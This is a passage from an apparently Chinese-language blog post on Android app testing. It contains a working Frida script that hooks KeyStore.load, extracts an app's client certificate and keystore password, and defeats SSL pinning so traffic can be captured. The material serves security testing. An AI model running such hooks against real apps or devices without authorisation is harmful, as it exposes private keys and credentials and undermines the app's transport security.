Java.use(&#x27;java.security.KeyStore&#x27;)[&#x27;load&#x27;].overload(&#x27;java.io.InputStream&#x27;, &#x27;[C&#x27;);</span></span><br><span class="line"><span class="string">        /* following function hooks to a Keystore.load(InputStream stream, char[] password) */</span></span><br><span class="line"><span class="string">        keyStoreLoadStream.implementation = function(stream, charArray) &#123;</span></span><br><span class="line"><span class="string">            /* sometimes this happen, I have no idea why, tho... */</span></span><br><span class="line"><span class="string">            if (stream == null) &#123;</span></span><br><span class="line"><span class="string">                /* just to avoid interfering with app&#x27;s flow */</span></span><br><span class="line"><span class="string">                this.load(stream, charArray);</span></span><br><span class="line"><span class="string">                return;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            /* just to notice the client we&#x27;ve hooked a KeyStore.load */</span></span><br><span class="line"><span class="string">            send(&#123;event: &#x27;+found&#x27;&#125;);</span></span><br><span class="line"><span class="string">            /* read the buffer stream to a variable */</span></span><br><span class="line"><span class="string">            var hexString = readStreamToHex (stream);</span></span><br><span class="line"><span class="string">            /* send KeyStore type to client shell */</span></span><br><span class="line"><span class="string">            send(&#123;event: &#x27;+type&#x27;, certType: this.getType()&#125;);</span></span><br><span class="line"><span class="string">            /* send KeyStore password to client shell */</span></span><br><span class="line"><span class="string">            send(&#123;event: &#x27;+pass&#x27;, password: charArray&#125;);</span></span><br><span class="line"><span class="string">            /* send the string representation to client shell */</span></span><br><span class="line"><span class="string">            send(&#123;event: &#x27;+write&#x27;, cert: hexString&#125;);</span></span><br><span class="line"><span class="string">            /* call the original implementation of &#x27;load&#x27; */</span></span><br><span class="line"><span class="string">            this.load(stream, charArray);</span></span><br><span class="line"><span class="string">            /* no need to return anything */</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;,0);</span></span><br><span class="line"><span class="string">/* following function reads an InputStream and returns an ASCII char representation of it */</span></span><br><span class="line"><span class="string">function readStreamToHex (stream) &#123;</span></span><br><span class="line"><span class="string">    var data = [];</span></span><br><span class="line"><span class="string">    var byteRead = stream.read();</span></span><br><span class="line"><span class="string">    while (byteRead != -1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        data.push( (&#x27;0&#x27; + (byteRead &amp; 0xFF).toString(16)).slice(-2) );</span></span><br><span class="line"><span class="string">                /* &lt;---------------- binary to hex ---------------&gt; */</span></span><br><span class="line"><span class="string">        byteRead = stream.read();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    stream.close();</span></span><br><span class="line"><span class="string">    return data.join(&#x27;&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[.] Attaching to device...&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    device = frida.get_remote_device()      </span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Can&#x27;t attach. Is the device connected?&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[.] Spawning the app...&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pid = device.spawn(app_name)</span><br><span class="line">    device.resume(pid)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Can&#x27;t spawn the App. Is filename correct?&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[.] Attaching to process...&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    process = device.attach(pid)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Can&#x27;t connect to App.&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[.] Launching js code...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  (run the app until needed, close it and then kill this script)&quot;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        sys.stdin.read()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;\nExiting now&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>这个脚本直接使用的话会有问题，提示找不到设备，需要把脚本内的<code>get_usb_device()</code>修改为<code>get_remote_device()</code>，另外Python调用的hook脚本需要<strong>使用adb进行端口转发</strong>，否则会提示找不到APP</p>
<p>演示：</p>
<p><img src="https://s2.loli.net/2022/04/22/j9E4lcnFwTKOqGe.png" alt="image-20220421103712203"></p>
<p>用hook到的密码和证书文件可以正常导入</p>
<p><img src="https://s2.loli.net/2022/04/22/KlXjfPpVHIO5eEg.png" alt="img"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>用好frida对测试APP很有帮助，如果APP使用了一些公共模块例如okhttp3等，那么一般来说对okhttp3配置SSL-PINNING方法是比较固定的，那我们就可以使用固定的hook脚本对相关方法进行改动，达到绕过抓包限制的目的；但如果开发者自定义了某些函数，则需要我们对APK进行反编译，定位函数并进行hook</p>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p>demo app：<a href="https://mp.weixin.qq.com/s/F9QRU4QKc-fSdxxarroNqQ">https://mp.weixin.qq.com/s/F9QRU4QKc-fSdxxarroNqQ</a></p>
<p><a href="https://www.52pojie.cn/thread-1128884-1-1.html">frida入门总结</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/101401252">frida api</a></p>
<p><a href="https://blog.csdn.net/cyjmosthandsome/article/details/120906998">Frida hook零基础教程</a></p>
]]></content>
      <categories>
        <category>APP</category>
      </categories>
      <tags>
        <tag>frida</tag>
      </tags>
  </entry>
</search>
